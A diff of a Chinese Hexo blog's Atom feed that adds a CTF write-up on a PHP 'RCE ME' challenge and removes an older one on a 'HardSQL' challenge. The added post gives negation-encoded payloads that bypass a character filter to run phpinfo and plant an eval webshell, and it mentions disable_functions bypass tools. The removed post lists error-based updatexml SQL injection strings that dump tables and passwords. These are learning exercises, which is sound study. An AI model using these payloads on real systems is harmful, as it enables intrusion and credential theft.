@@ -6,7 +6,7 @@
   <link href="http://daweitech.github.io/atom.xml" rel="self"/>
   
   <link href="http://daweitech.github.io/"/>
-  <updated>2021-09-29T08:44:19.842Z</updated>
+  <updated>2021-09-29T13:46:03.764Z</updated>
   <id>http://daweitech.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战 2019 RCE ME</title>
+    <link href="http://daweitech.github.io/2021/09/29/buu/25/"/>
+    <id>http://daweitech.github.io/2021/09/29/buu/25/</id>
+    <published>2021-09-29T13:28:21.000Z</published>
+    <updated>2021-09-29T13:46:03.764Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/2021/09/29/buu/25/image-20210929213110592.png" alt="image-20210929213110592"></p><p>GET传参</p><p>strlen：长度不超过40</p><p>preg_match：匹配英文字母和数字，die NO</p><p>满足条件就当做php执行并且不报错</p><p>[<a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">极客大挑战 2019]RCE ME - 云千 - 博客园 (cnblogs.com)</a></p><p>参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以用异或或者取反绕过</span><br><span class="line">异或绕过是指使用各种特殊字符的异或构造出字母和数字。取反绕过是对语句取反。</span><br></pre></td></tr></table></figure><p>生成查询PHP info 的payload代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p><p>构造完的语句进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929213713432.png" alt="image-20210929213713432"></p><p>看一些信息:</p><p><img src="/2021/09/29/buu/25/image-20210929213849813.png" alt="image-20210929213849813"></p><p>禁用的函数相当的多</p><p>先传木马连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); </span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929214111148.png" alt="image-20210929214111148"></p><p>连上之后发现权限过低</p><p><img src="/2021/09/29/buu/25/image-20210929214319688.png" alt="image-20210929214319688"></p><p>要读取flag，需要先执行readflag,但是因为禁用了很多函数，没有办法执行命令，这时候需要绕过disable_functions.方法好像很多，有的用蚁剑的插件，有的劫持共享so，也有一些工具<br>1.这里用工具<br>地址<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），</p><p>2.蚁剑插件直接绕过</p><p><img src="/2021/09/29/buu/25/image-20210929214454384.png" alt="image-20210929214454384"></p><p><img src="/2021/09/29/buu/25/image-20210929214557378.png" alt="image-20210929214557378"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/09/29/buu/25/image-20210929213110592.png&quot; alt=&quot;image-20210929213110592&quot;&gt;&lt;/p&gt;
+&lt;p&gt;GET传参&lt;/p&gt;
+&lt;p&gt;strlen：长度不超过40&lt;/p&gt;
+&lt;p&gt;preg_m</summary>
+      
+    
+    
+    
+    
+    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
+    
+  </entry>
   
   <entry>
     <title>MRCTF2020 wirteup</title>
@@ -460,28 +485,6 @@
     
     
     <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>极客大挑战 2019 HardSQL</title>
-    <link href="http://daweitech.github.io/2021/08/30/buu/16/"/>
-    <id>http://daweitech.github.io/2021/08/30/buu/16/</id>
-    <published>2021-08-30T00:55:58.000Z</published>
-    <updated>2021-08-30T01:36:03.240Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="0x00知识点："><a href="#0x00知识点：" class="headerlink" title="0x00知识点："></a>0x00知识点：</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sql注入中的updatexml()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><p>改变XML_document中符合XPATH_string的值</p><p>例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>​            其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure><p>xpath语法总结：<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档</p><p>第二个参数是用Xpath路径法表示的查找路径</p><p>例子：</p><p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p><h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p><img src="/2021/08/30/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>爆出库</p><p><img src="/2021/08/30/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p><p>爆出表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p><p>爆出列名</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p><p>右边的flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line"></span><br><span class="line">1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过</span><br><span class="line">2：&#x3D;号被过滤可以用like来绕过</span><br><span class="line">3：substring与mid被过滤可以用right与left来绕过</span><br></pre></td></tr></table></figure><h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">极客大挑战 2019]HardSQL_o3Ev的博客-CSDN博客</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h4 id=&quot;0x00知识点：&quot;&gt;&lt;a href=&quot;#0x00知识点：&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点：&quot;&gt;&lt;/a&gt;0x00知识点：&lt;/h4&gt;&lt;h5 id=&quot;updatexml&quot;&gt;&lt;a href=&quot;#updatexml&quot; class=&quot;he</summary>
-      
-    
-    
-    
-    
-    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
     
   </entry>
   
